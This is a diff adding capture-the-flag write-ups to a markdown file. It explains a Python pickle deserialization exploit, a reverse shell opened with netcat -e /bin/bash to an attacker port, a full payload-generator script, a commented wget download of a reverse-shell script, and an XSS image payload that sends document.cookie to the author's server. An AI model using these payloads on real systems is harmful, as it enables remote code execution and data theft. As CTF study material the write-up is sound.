@@ -301,6 +301,94 @@ Lower case b64 flag: Y3Rme2FhZjE1Y2FjZmJhNjE1ZDUxMzcyMzg2OTA5YzQ3NzFmMDgzNjI4NGF
 ctf{aaf15cacfba615d51372386909c4771f0836284ad1a539bcef49201c660631ed}
 
 
+## Rundown
+
+Running a get command on the server displays the message `APIv2 @ 2020 - You think you got methods for this?`. Upon sending a post request we are met with Werkzeug error trace:
+
+```
+    @app.route("/", methods=["POST"])
+    def newpost():
+    Open an interactive python shell in this frame  ​picklestr = base64.urlsafe_b64decode(request.data
+      if " " in picklestr:
+        return "The ' ' is blacklisted!"
+      postObj = cPickle.loads(picklestr)
+      return ""
+      
+    if __name__ == "__main__":
+        app.run(host = "0.0.0.0", debug=True)
+```
+
+It appears the server is trying to deserialize data in an unsafe manner. I started working on this task with [this script](https://gist.github.com/msamogh/bb9bad96046ad390e5ae62f7e8b1d78c).
+
+My first attempt was to run a sleep command in order to check if I can run shell commands. Two main difficulties need to be overcome in order to do this:
+ * The os library might not be imported by the server (turned out to be true)
+ * The space character is not allowed inside our payload
+ 
+The command we are trying to run is `os.system("sleep 10")`.
+In order to bypass the space character check we can change the command into `eval('os.system("sleep"+str(chr(32))+"10")')`. By using this trick we dont actually send any spaces and the command works as intended.
+To avoid needing to `import os` we can replace `os` with `__import__("os")`. The command we needed to send becomes `eval('os.system("sleep"+str(chr(32))+"10")')` and does indeed result in the server sleeping for 10 seconds. We will use this formatting for any future commands we try to send to the server
+
+Now we could try and send a `cat flag` command however that would be no good because the server would jsut display the result locally and not send it over the web. We need to get a reverse shell. I initially tried to `curl` or `wget` a payload which I would later execute to achieve a reverse shell, however the programs did not seem to be installed. I ran the commands `ls <PATH> || sleep 10` in order to check if certain programs existed. If the response returned immediately it meant the program existed. I found that `/bin/nc.traditional` is installed on the server.
+
+I ran the command `nc -l -p 4000` locally and sent the command `/bin/nc.traditional -e /bin/bash <snip> 4000` to the server which resulted in a reverse shell.
+
+The final payload generator looked like this:
+```
+#!/usr/bin/env python
+
+import os
+import sys
+import pickle
+import cPickle
+import base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (eval(fn), (cmd,))
+
+try:
+    pickle_type = sys.argv[3]
+    cmd = sys.argv[2]
+    fn = sys.argv[1]
+except:
+    pickle_type = 'cpickle' # or cpickle
+    # cmd = '__import__("os").system("/usr/bin/wget"+str(chr(32))+"http://<snip>:4000/rev_shell.py"+str(chr(32))+"-O"+str(chr(32))+"/tmp/rev_shell.py")'
+    cmd = '__import__("os").system("/bin/nc.traditional"+str(chr(32))+"-e"+str(chr(32))+"/bin/bash"+str(chr(32))+"<snip>"+str(chr(32))+"4000")'
+
+    fn = 'eval'
+
+print("Will {} {}({})".format(pickle_type, fn, cmd))
+shellcode = pickle.dumps(Exploit())
+print(base64.b64encode(shellcode))
+```
+
+I used Burp Suite as a proxy in order to change in flight requests with the desired POST verb and the payload. After getting the reverse shell I ran `cat flag`
+
+#### Flag
+
+ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}
+
+## Manual review
+
+I created an account on the webserver and send the message <script>alert(1);</script> which prompted the alert(1) message. After navigating the whole website and not finding anything I tought that maybe there was an "admin" which does review my message in the backend and does run the javascript code sent by me.
+
+I ran a local server and sent the payload `<img src=x onerror=this.src='http://<snip>:4000/leak?cookie='+document.cookie>` which resulted in an access from an external IP. The cookies were not very helpful because of the httponly flag so i started to dump more data from the remote browser. Other dumped data:
+ * the `document.body` only displayed the request number
+ * the `window.location.href` displayed the url used by the server (something along the lines of `asdasdasdasdasdasdadadadad`). It would only display the last message and only once so it was not very useful
+ * the `navigator.userAgent` which did contain the flag
+
+#### Flag
+
+ctf{ff695564fdb6943c73fa76f9ca5cdd51dd3f7510336ffa3845baa34e8d44b436}
+
+## Not a fuzz
+
+
+
+#### Flag
+
+ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}
+
 ## Better cat
 
 Classic basic task with plaintext string in memory.
@@ -324,8 +412,6 @@ Rearrange flag and we get the solution.
 
 #### Flag
 ctf{a818778ec7a9fc1988724ae3700b42e998eb09450eab7f1236e53bfdcd923878}
-<details>
-  <summary>Decode flag </summary>
-</details>
+
 
 
